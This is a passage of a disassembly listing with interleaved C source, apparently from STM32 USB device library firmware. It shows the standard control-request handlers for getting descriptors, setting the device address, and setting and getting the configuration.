            USBD_CtlError(pdev, req);
 800bf10:	6839      	ldr	r1, [r7, #0]
 800bf12:	6878      	ldr	r0, [r7, #4]
 800bf14:	f000 fa7d 	bl	800c412 <USBD_CtlError>
            err++;
 800bf18:	7afb      	ldrb	r3, [r7, #11]
 800bf1a:	3301      	adds	r3, #1
 800bf1c:	72fb      	strb	r3, [r7, #11]
          break;
 800bf1e:	e03b      	b.n	800bf98 <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800bf20:	687b      	ldr	r3, [r7, #4]
 800bf22:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bf26:	695b      	ldr	r3, [r3, #20]
 800bf28:	2b00      	cmp	r3, #0
 800bf2a:	d00b      	beq.n	800bf44 <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800bf2c:	687b      	ldr	r3, [r7, #4]
 800bf2e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bf32:	695b      	ldr	r3, [r3, #20]
 800bf34:	687a      	ldr	r2, [r7, #4]
 800bf36:	7c12      	ldrb	r2, [r2, #16]
 800bf38:	f107 0108 	add.w	r1, r7, #8
 800bf3c:	4610      	mov	r0, r2
 800bf3e:	4798      	blx	r3
 800bf40:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bf42:	e029      	b.n	800bf98 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bf44:	6839      	ldr	r1, [r7, #0]
 800bf46:	6878      	ldr	r0, [r7, #4]
 800bf48:	f000 fa63 	bl	800c412 <USBD_CtlError>
            err++;
 800bf4c:	7afb      	ldrb	r3, [r7, #11]
 800bf4e:	3301      	adds	r3, #1
 800bf50:	72fb      	strb	r3, [r7, #11]
          break;
 800bf52:	e021      	b.n	800bf98 <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800bf54:	687b      	ldr	r3, [r7, #4]
 800bf56:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bf5a:	699b      	ldr	r3, [r3, #24]
 800bf5c:	2b00      	cmp	r3, #0
 800bf5e:	d00b      	beq.n	800bf78 <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800bf60:	687b      	ldr	r3, [r7, #4]
 800bf62:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bf66:	699b      	ldr	r3, [r3, #24]
 800bf68:	687a      	ldr	r2, [r7, #4]
 800bf6a:	7c12      	ldrb	r2, [r2, #16]
 800bf6c:	f107 0108 	add.w	r1, r7, #8
 800bf70:	4610      	mov	r0, r2
 800bf72:	4798      	blx	r3
 800bf74:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bf76:	e00f      	b.n	800bf98 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bf78:	6839      	ldr	r1, [r7, #0]
 800bf7a:	6878      	ldr	r0, [r7, #4]
 800bf7c:	f000 fa49 	bl	800c412 <USBD_CtlError>
            err++;
 800bf80:	7afb      	ldrb	r3, [r7, #11]
 800bf82:	3301      	adds	r3, #1
 800bf84:	72fb      	strb	r3, [r7, #11]
          break;
 800bf86:	e007      	b.n	800bf98 <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bf88:	6839      	ldr	r1, [r7, #0]
 800bf8a:	6878      	ldr	r0, [r7, #4]
 800bf8c:	f000 fa41 	bl	800c412 <USBD_CtlError>
          err++;
 800bf90:	7afb      	ldrb	r3, [r7, #11]
 800bf92:	3301      	adds	r3, #1
 800bf94:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800bf96:	bf00      	nop
      }
      break;
 800bf98:	e037      	b.n	800c00a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bf9a:	687b      	ldr	r3, [r7, #4]
 800bf9c:	7c1b      	ldrb	r3, [r3, #16]
 800bf9e:	2b00      	cmp	r3, #0
 800bfa0:	d109      	bne.n	800bfb6 <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800bfa2:	687b      	ldr	r3, [r7, #4]
 800bfa4:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bfa8:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bfaa:	f107 0208 	add.w	r2, r7, #8
 800bfae:	4610      	mov	r0, r2
 800bfb0:	4798      	blx	r3
 800bfb2:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bfb4:	e029      	b.n	800c00a <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bfb6:	6839      	ldr	r1, [r7, #0]
 800bfb8:	6878      	ldr	r0, [r7, #4]
 800bfba:	f000 fa2a 	bl	800c412 <USBD_CtlError>
        err++;
 800bfbe:	7afb      	ldrb	r3, [r7, #11]
 800bfc0:	3301      	adds	r3, #1
 800bfc2:	72fb      	strb	r3, [r7, #11]
      break;
 800bfc4:	e021      	b.n	800c00a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bfc6:	687b      	ldr	r3, [r7, #4]
 800bfc8:	7c1b      	ldrb	r3, [r3, #16]
 800bfca:	2b00      	cmp	r3, #0
 800bfcc:	d10d      	bne.n	800bfea <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bfce:	687b      	ldr	r3, [r7, #4]
 800bfd0:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bfd4:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bfd6:	f107 0208 	add.w	r2, r7, #8
 800bfda:	4610      	mov	r0, r2
 800bfdc:	4798      	blx	r3
 800bfde:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bfe0:	68fb      	ldr	r3, [r7, #12]
 800bfe2:	3301      	adds	r3, #1
 800bfe4:	2207      	movs	r2, #7
 800bfe6:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bfe8:	e00f      	b.n	800c00a <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bfea:	6839      	ldr	r1, [r7, #0]
 800bfec:	6878      	ldr	r0, [r7, #4]
 800bfee:	f000 fa10 	bl	800c412 <USBD_CtlError>
        err++;
 800bff2:	7afb      	ldrb	r3, [r7, #11]
 800bff4:	3301      	adds	r3, #1
 800bff6:	72fb      	strb	r3, [r7, #11]
      break;
 800bff8:	e007      	b.n	800c00a <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bffa:	6839      	ldr	r1, [r7, #0]
 800bffc:	6878      	ldr	r0, [r7, #4]
 800bffe:	f000 fa08 	bl	800c412 <USBD_CtlError>
      err++;
 800c002:	7afb      	ldrb	r3, [r7, #11]
 800c004:	3301      	adds	r3, #1
 800c006:	72fb      	strb	r3, [r7, #11]
      break;
 800c008:	bf00      	nop
  }

  if (err != 0U)
 800c00a:	7afb      	ldrb	r3, [r7, #11]
 800c00c:	2b00      	cmp	r3, #0
 800c00e:	d11e      	bne.n	800c04e <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800c010:	683b      	ldr	r3, [r7, #0]
 800c012:	88db      	ldrh	r3, [r3, #6]
 800c014:	2b00      	cmp	r3, #0
 800c016:	d016      	beq.n	800c046 <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800c018:	893b      	ldrh	r3, [r7, #8]
 800c01a:	2b00      	cmp	r3, #0
 800c01c:	d00e      	beq.n	800c03c <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800c01e:	683b      	ldr	r3, [r7, #0]
 800c020:	88da      	ldrh	r2, [r3, #6]
 800c022:	893b      	ldrh	r3, [r7, #8]
 800c024:	4293      	cmp	r3, r2
 800c026:	bf28      	it	cs
 800c028:	4613      	movcs	r3, r2
 800c02a:	b29b      	uxth	r3, r3
 800c02c:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800c02e:	893b      	ldrh	r3, [r7, #8]
 800c030:	461a      	mov	r2, r3
 800c032:	68f9      	ldr	r1, [r7, #12]
 800c034:	6878      	ldr	r0, [r7, #4]
 800c036:	f000 fa5d 	bl	800c4f4 <USBD_CtlSendData>
 800c03a:	e009      	b.n	800c050 <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800c03c:	6839      	ldr	r1, [r7, #0]
 800c03e:	6878      	ldr	r0, [r7, #4]
 800c040:	f000 f9e7 	bl	800c412 <USBD_CtlError>
 800c044:	e004      	b.n	800c050 <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800c046:	6878      	ldr	r0, [r7, #4]
 800c048:	f000 faae 	bl	800c5a8 <USBD_CtlSendStatus>
 800c04c:	e000      	b.n	800c050 <USBD_GetDescriptor+0x320>
    return;
 800c04e:	bf00      	nop
  }
}
 800c050:	3710      	adds	r7, #16
 800c052:	46bd      	mov	sp, r7
 800c054:	bd80      	pop	{r7, pc}
 800c056:	bf00      	nop

0800c058 <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c058:	b580      	push	{r7, lr}
 800c05a:	b084      	sub	sp, #16
 800c05c:	af00      	add	r7, sp, #0
 800c05e:	6078      	str	r0, [r7, #4]
 800c060:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800c062:	683b      	ldr	r3, [r7, #0]
 800c064:	889b      	ldrh	r3, [r3, #4]
 800c066:	2b00      	cmp	r3, #0
 800c068:	d131      	bne.n	800c0ce <USBD_SetAddress+0x76>
 800c06a:	683b      	ldr	r3, [r7, #0]
 800c06c:	88db      	ldrh	r3, [r3, #6]
 800c06e:	2b00      	cmp	r3, #0
 800c070:	d12d      	bne.n	800c0ce <USBD_SetAddress+0x76>
 800c072:	683b      	ldr	r3, [r7, #0]
 800c074:	885b      	ldrh	r3, [r3, #2]
 800c076:	2b7f      	cmp	r3, #127	; 0x7f
 800c078:	d829      	bhi.n	800c0ce <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800c07a:	683b      	ldr	r3, [r7, #0]
 800c07c:	885b      	ldrh	r3, [r3, #2]
 800c07e:	b2db      	uxtb	r3, r3
 800c080:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800c084:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c086:	687b      	ldr	r3, [r7, #4]
 800c088:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c08c:	b2db      	uxtb	r3, r3
 800c08e:	2b03      	cmp	r3, #3
 800c090:	d104      	bne.n	800c09c <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800c092:	6839      	ldr	r1, [r7, #0]
 800c094:	6878      	ldr	r0, [r7, #4]
 800c096:	f000 f9bc 	bl	800c412 <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c09a:	e01d      	b.n	800c0d8 <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800c09c:	687b      	ldr	r3, [r7, #4]
 800c09e:	7bfa      	ldrb	r2, [r7, #15]
 800c0a0:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800c0a4:	7bfb      	ldrb	r3, [r7, #15]
 800c0a6:	4619      	mov	r1, r3
 800c0a8:	6878      	ldr	r0, [r7, #4]
 800c0aa:	f000 ffbf 	bl	800d02c <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800c0ae:	6878      	ldr	r0, [r7, #4]
 800c0b0:	f000 fa7a 	bl	800c5a8 <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800c0b4:	7bfb      	ldrb	r3, [r7, #15]
 800c0b6:	2b00      	cmp	r3, #0
 800c0b8:	d004      	beq.n	800c0c4 <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800c0ba:	687b      	ldr	r3, [r7, #4]
 800c0bc:	2202      	movs	r2, #2
 800c0be:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c0c2:	e009      	b.n	800c0d8 <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800c0c4:	687b      	ldr	r3, [r7, #4]
 800c0c6:	2201      	movs	r2, #1
 800c0c8:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c0cc:	e004      	b.n	800c0d8 <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800c0ce:	6839      	ldr	r1, [r7, #0]
 800c0d0:	6878      	ldr	r0, [r7, #4]
 800c0d2:	f000 f99e 	bl	800c412 <USBD_CtlError>
  }
}
 800c0d6:	bf00      	nop
 800c0d8:	bf00      	nop
 800c0da:	3710      	adds	r7, #16
 800c0dc:	46bd      	mov	sp, r7
 800c0de:	bd80      	pop	{r7, pc}

0800c0e0 <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c0e0:	b580      	push	{r7, lr}
 800c0e2:	b084      	sub	sp, #16
 800c0e4:	af00      	add	r7, sp, #0
 800c0e6:	6078      	str	r0, [r7, #4]
 800c0e8:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800c0ea:	2300      	movs	r3, #0
 800c0ec:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800c0ee:	683b      	ldr	r3, [r7, #0]
 800c0f0:	885b      	ldrh	r3, [r3, #2]
 800c0f2:	b2da      	uxtb	r2, r3
 800c0f4:	4b4e      	ldr	r3, [pc, #312]	; (800c230 <USBD_SetConfig+0x150>)
 800c0f6:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
 800c0f8:	4b4d      	ldr	r3, [pc, #308]	; (800c230 <USBD_SetConfig+0x150>)
 800c0fa:	781b      	ldrb	r3, [r3, #0]
 800c0fc:	2b01      	cmp	r3, #1
 800c0fe:	d905      	bls.n	800c10c <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800c100:	6839      	ldr	r1, [r7, #0]
 800c102:	6878      	ldr	r0, [r7, #4]
 800c104:	f000 f985 	bl	800c412 <USBD_CtlError>
    return USBD_FAIL;
 800c108:	2303      	movs	r3, #3
 800c10a:	e08c      	b.n	800c226 <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800c10c:	687b      	ldr	r3, [r7, #4]
 800c10e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c112:	b2db      	uxtb	r3, r3
 800c114:	2b02      	cmp	r3, #2
 800c116:	d002      	beq.n	800c11e <USBD_SetConfig+0x3e>
 800c118:	2b03      	cmp	r3, #3
 800c11a:	d029      	beq.n	800c170 <USBD_SetConfig+0x90>
 800c11c:	e075      	b.n	800c20a <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800c11e:	4b44      	ldr	r3, [pc, #272]	; (800c230 <USBD_SetConfig+0x150>)
 800c120:	781b      	ldrb	r3, [r3, #0]
 800c122:	2b00      	cmp	r3, #0
 800c124:	d020      	beq.n	800c168 <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800c126:	4b42      	ldr	r3, [pc, #264]	; (800c230 <USBD_SetConfig+0x150>)
 800c128:	781b      	ldrb	r3, [r3, #0]
 800c12a:	461a      	mov	r2, r3
 800c12c:	687b      	ldr	r3, [r7, #4]
 800c12e:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800c130:	4b3f      	ldr	r3, [pc, #252]	; (800c230 <USBD_SetConfig+0x150>)
 800c132:	781b      	ldrb	r3, [r3, #0]
 800c134:	4619      	mov	r1, r3
 800c136:	6878      	ldr	r0, [r7, #4]
 800c138:	f7ff f848 	bl	800b1cc <USBD_SetClassConfig>
 800c13c:	4603      	mov	r3, r0
 800c13e:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800c140:	7bfb      	ldrb	r3, [r7, #15]
 800c142:	2b00      	cmp	r3, #0
 800c144:	d008      	beq.n	800c158 <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800c146:	6839      	ldr	r1, [r7, #0]
 800c148:	6878      	ldr	r0, [r7, #4]
 800c14a:	f000 f962 	bl	800c412 <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800c14e:	687b      	ldr	r3, [r7, #4]
 800c150:	2202      	movs	r2, #2
 800c152:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800c156:	e065      	b.n	800c224 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800c158:	6878      	ldr	r0, [r7, #4]
 800c15a:	f000 fa25 	bl	800c5a8 <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800c15e:	687b      	ldr	r3, [r7, #4]
 800c160:	2203      	movs	r2, #3
 800c162:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800c166:	e05d      	b.n	800c224 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800c168:	6878      	ldr	r0, [r7, #4]
 800c16a:	f000 fa1d 	bl	800c5a8 <USBD_CtlSendStatus>
      break;
 800c16e:	e059      	b.n	800c224 <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800c170:	4b2f      	ldr	r3, [pc, #188]	; (800c230 <USBD_SetConfig+0x150>)
 800c172:	781b      	ldrb	r3, [r3, #0]
 800c174:	2b00      	cmp	r3, #0
 800c176:	d112      	bne.n	800c19e <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800c178:	687b      	ldr	r3, [r7, #4]
 800c17a:	2202      	movs	r2, #2
 800c17c:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800c180:	4b2b      	ldr	r3, [pc, #172]	; (800c230 <USBD_SetConfig+0x150>)
 800c182:	781b      	ldrb	r3, [r3, #0]
 800c184:	461a      	mov	r2, r3
 800c186:	687b      	ldr	r3, [r7, #4]
 800c188:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800c18a:	4b29      	ldr	r3, [pc, #164]	; (800c230 <USBD_SetConfig+0x150>)
 800c18c:	781b      	ldrb	r3, [r3, #0]
 800c18e:	4619      	mov	r1, r3
 800c190:	6878      	ldr	r0, [r7, #4]
 800c192:	f7ff f837 	bl	800b204 <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800c196:	6878      	ldr	r0, [r7, #4]
 800c198:	f000 fa06 	bl	800c5a8 <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800c19c:	e042      	b.n	800c224 <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800c19e:	4b24      	ldr	r3, [pc, #144]	; (800c230 <USBD_SetConfig+0x150>)
 800c1a0:	781b      	ldrb	r3, [r3, #0]
 800c1a2:	461a      	mov	r2, r3
 800c1a4:	687b      	ldr	r3, [r7, #4]
 800c1a6:	685b      	ldr	r3, [r3, #4]
 800c1a8:	429a      	cmp	r2, r3
 800c1aa:	d02a      	beq.n	800c202 <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800c1ac:	687b      	ldr	r3, [r7, #4]
 800c1ae:	685b      	ldr	r3, [r3, #4]
 800c1b0:	b2db      	uxtb	r3, r3
 800c1b2:	4619      	mov	r1, r3
 800c1b4:	6878      	ldr	r0, [r7, #4]
 800c1b6:	f7ff f825 	bl	800b204 <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800c1ba:	4b1d      	ldr	r3, [pc, #116]	; (800c230 <USBD_SetConfig+0x150>)
 800c1bc:	781b      	ldrb	r3, [r3, #0]
 800c1be:	461a      	mov	r2, r3
 800c1c0:	687b      	ldr	r3, [r7, #4]
 800c1c2:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800c1c4:	4b1a      	ldr	r3, [pc, #104]	; (800c230 <USBD_SetConfig+0x150>)
 800c1c6:	781b      	ldrb	r3, [r3, #0]
 800c1c8:	4619      	mov	r1, r3
 800c1ca:	6878      	ldr	r0, [r7, #4]
 800c1cc:	f7fe fffe 	bl	800b1cc <USBD_SetClassConfig>
 800c1d0:	4603      	mov	r3, r0
 800c1d2:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800c1d4:	7bfb      	ldrb	r3, [r7, #15]
 800c1d6:	2b00      	cmp	r3, #0
 800c1d8:	d00f      	beq.n	800c1fa <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800c1da:	6839      	ldr	r1, [r7, #0]
 800c1dc:	6878      	ldr	r0, [r7, #4]
 800c1de:	f000 f918 	bl	800c412 <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800c1e2:	687b      	ldr	r3, [r7, #4]
 800c1e4:	685b      	ldr	r3, [r3, #4]
 800c1e6:	b2db      	uxtb	r3, r3
 800c1e8:	4619      	mov	r1, r3
 800c1ea:	6878      	ldr	r0, [r7, #4]
 800c1ec:	f7ff f80a 	bl	800b204 <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800c1f0:	687b      	ldr	r3, [r7, #4]
 800c1f2:	2202      	movs	r2, #2
 800c1f4:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800c1f8:	e014      	b.n	800c224 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800c1fa:	6878      	ldr	r0, [r7, #4]
 800c1fc:	f000 f9d4 	bl	800c5a8 <USBD_CtlSendStatus>
      break;
 800c200:	e010      	b.n	800c224 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800c202:	6878      	ldr	r0, [r7, #4]
 800c204:	f000 f9d0 	bl	800c5a8 <USBD_CtlSendStatus>
      break;
 800c208:	e00c      	b.n	800c224 <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800c20a:	6839      	ldr	r1, [r7, #0]
 800c20c:	6878      	ldr	r0, [r7, #4]
 800c20e:	f000 f900 	bl	800c412 <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800c212:	4b07      	ldr	r3, [pc, #28]	; (800c230 <USBD_SetConfig+0x150>)
 800c214:	781b      	ldrb	r3, [r3, #0]
 800c216:	4619      	mov	r1, r3
 800c218:	6878      	ldr	r0, [r7, #4]
 800c21a:	f7fe fff3 	bl	800b204 <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800c21e:	2303      	movs	r3, #3
 800c220:	73fb      	strb	r3, [r7, #15]
      break;
 800c222:	bf00      	nop
  }

  return ret;
 800c224:	7bfb      	ldrb	r3, [r7, #15]
}
 800c226:	4618      	mov	r0, r3
 800c228:	3710      	adds	r7, #16
 800c22a:	46bd      	mov	sp, r7
 800c22c:	bd80      	pop	{r7, pc}
 800c22e:	bf00      	nop
 800c230:	200003bc 	.word	0x200003bc

0800c234 <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c234:	b580      	push	{r7, lr}
 800c236:	b082      	sub	sp, #8
 800c238:	af00      	add	r7, sp, #0
 800c23a:	6078      	str	r0, [r7, #4]
 800c23c:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800c23e:	683b      	ldr	r3, [r7, #0]
 800c240:	88db      	ldrh	r3, [r3, #6]
 800c242:	2b01      	cmp	r3, #1
 800c244:	d004      	beq.n	800c250 <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800c246:	6839      	ldr	r1, [r7, #0]
 800c248:	6878      	ldr	r0, [r7, #4]
 800c24a:	f000 f8e2 	bl	800c412 <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800c24e:	e023      	b.n	800c298 <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800c250:	687b      	ldr	r3, [r7, #4]
 800c252:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c256:	b2db      	uxtb	r3, r3
 800c258:	2b02      	cmp	r3, #2
 800c25a:	dc02      	bgt.n	800c262 <USBD_GetConfig+0x2e>
 800c25c:	2b00      	cmp	r3, #0
 800c25e:	dc03      	bgt.n	800c268 <USBD_GetConfig+0x34>
 800c260:	e015      	b.n	800c28e <USBD_GetConfig+0x5a>
 800c262:	2b03      	cmp	r3, #3
 800c264:	d00b      	beq.n	800c27e <USBD_GetConfig+0x4a>
 800c266:	e012      	b.n	800c28e <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800c268:	687b      	ldr	r3, [r7, #4]
 800c26a:	2200      	movs	r2, #0
 800c26c:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800c26e:	687b      	ldr	r3, [r7, #4]
 800c270:	3308      	adds	r3, #8
 800c272:	2201      	movs	r2, #1
 800c274:	4619      	mov	r1, r3
 800c276:	6878      	ldr	r0, [r7, #4]
 800c278:	f000 f93c 	bl	800c4f4 <USBD_CtlSendData>
        break;
 800c27c:	e00c      	b.n	800c298 <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800c27e:	687b      	ldr	r3, [r7, #4]
 800c280:	3304      	adds	r3, #4
 800c282:	2201      	movs	r2, #1
 800c284:	4619      	mov	r1, r3
 800c286:	6878      	ldr	r0, [r7, #4]
 800c288:	f000 f934 	bl	800c4f4 <USBD_CtlSendData>
        break;
 800c28c:	e004      	b.n	800c298 <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800c28e:	6839      	ldr	r1, [r7, #0]
 800c290:	6878      	ldr	r0, [r7, #4]
 800c292:	f000 f8be 	bl	800c412 <USBD_CtlError>
        break;
 800c296:	bf00      	nop
}
 800c298:	bf00      	nop
 800c29a:	3708      	adds	r7, #8
 800c29c:	46bd      	mov	sp, r7
 800c29e:	bd80      	pop	{r7, pc}

0800c2a0 <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c2a0:	b580      	push	{r7, lr}
 800c2a2:	b082      	sub	sp, #8
 800c2a4:	af00      	add	r7, sp, #0
 800c2a6:	6078      	str	r0, [r7, #4]
 800c2a8:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c2aa:	687b      	ldr	r3, [r7, #4]
 800c2ac:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c2b0:	b2db      	uxtb	r3, r3
 800c2b2:	3b01      	subs	r3, #1
 800c2b4:	2b02      	cmp	r3, #2
 800c2b6:	d81e      	bhi.n	800c2f6 <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800c2b8:	683b      	ldr	r3, [r7, #0]
 800c2ba:	88db      	ldrh	r3, [r3, #6]
 800c2bc:	2b02      	cmp	r3, #2
 800c2be:	d004      	beq.n	800c2ca <USBD_GetStatus+0x2a>
      {
